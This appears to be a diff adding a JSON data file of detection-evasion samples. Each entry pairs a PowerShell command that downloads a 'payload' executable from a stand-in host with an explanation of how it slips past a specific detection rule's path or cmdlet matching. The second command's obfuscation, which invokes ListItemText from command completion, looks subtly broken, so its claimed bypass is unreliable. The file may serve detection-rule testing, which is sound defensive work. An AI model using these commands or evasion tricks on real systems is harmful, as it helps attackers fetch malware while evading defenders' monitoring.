@@ -1,0 +1,10 @@
+[
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload' -OutFile 'C:\\ProgramData\\payload.exe'\"",
+    "explanation": "The rule uses 'all of selection_*' logic, requiring the destination file to reside in one of the specific paths listed in 'selection_susp_locations'. By using 'C:\\ProgramData\\', which is a common writeable directory for standard users but omitted from the detection list, the location constraint fails to match, completely bypassing the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"$url = 'http://example.com/payload'; $path = 'C:\\Windows\\Temp\\payload.exe'; [Management.Automation.CommandCompletion]::CompleteInput('Invoke-Web', 10).CompletionMatches[0].ListItemText.Invoke() -Uri $url -OutFile $path\"",
+    "explanation": "The rule relies on discovering specific cmdlets or their short aliases (e.g., 'Invoke-WebRequest', 'iwr ') inside the command line token. By invoking the command indirectly using internal automation completion or string concatenation techniques, the literal string pattern inside 'selection_commands' is avoided while executing the same operation."
+  }
+]
